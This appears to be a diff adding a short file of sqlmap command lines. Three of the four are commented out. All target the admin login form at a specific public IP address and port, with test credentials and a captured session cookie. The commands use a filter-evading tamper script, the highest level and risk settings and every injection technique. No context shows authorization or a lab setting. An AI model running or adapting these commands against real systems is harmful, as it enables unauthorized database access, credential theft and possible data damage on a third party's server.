@@ -1,0 +1,4 @@
+sqlmap -u http://121.199.46.85:8888/admin/mylogin -p "username,password" --data='username=ttttest&password=tttestpw' --cookie=JSESSIONID=D126ABA9F90347617B9ECE60525F473D --tamper=space2comment --level=3 --risk=3 --technique=BEUSTQ --method POST
+#sqlmap -u http://121.199.46.85:8888/admin/mylogin -p username --data='username=ttttest&password=tttestpw' --cookie=JSESSIONID=D126ABA9F90347617B9ECE60525F473D --tamper=space2comment --level=3 --risk=3 --technique=BEUSTQ
+#sqlmap -u http://121.199.46.85:8888/admin/mylogin -p username -p password --data='username=ttttest&password=tttestpw' --cookie=JSESSIONID=D126ABA9F90347617B9ECE60525F473D --tamper=space2comment --level=3 --risk=3 --technique=BEUSTQ
+#sqlmap -u http://121.199.46.85:8888/admin/mylogin -p username -p password --data='username=test&password=testpw' --cookie=JSESSIONID=D126ABA9F90347617B9ECE60525F473D --tamper=space2comment
